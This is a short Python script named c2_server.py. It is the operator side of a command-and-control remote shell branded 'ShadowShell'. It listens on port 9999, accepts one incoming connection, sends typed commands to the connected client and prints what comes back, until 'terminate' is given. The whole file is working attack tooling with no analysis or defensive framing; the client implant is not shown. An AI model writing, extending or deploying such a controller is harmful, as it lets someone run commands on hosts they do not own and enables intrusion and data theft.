# c2_server.py
import socket

def start_server():
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 9999       # Arbitrary non-privileged port

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    
    print(f"[*] C2 Server listening on {host}:{port}...")

    # Accept the connection
    client_socket, addr = server_socket.accept()
    print(f"[+] Connection established from {addr[0]}:{addr[1]}")

    # Bidirectional Loop
    while True:
        command = input("ShadowShell> ")
        
        if 'terminate' in command:
            client_socket.send('terminate'.encode())
            break
        
        if command.strip() == '':
            continue

        # Send command to client
        client_socket.send(command.encode())
        
        # Receive response from client (buffer size 4096)
        response = client_socket.recv(4096).decode()
        print(response)

    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    start_server()
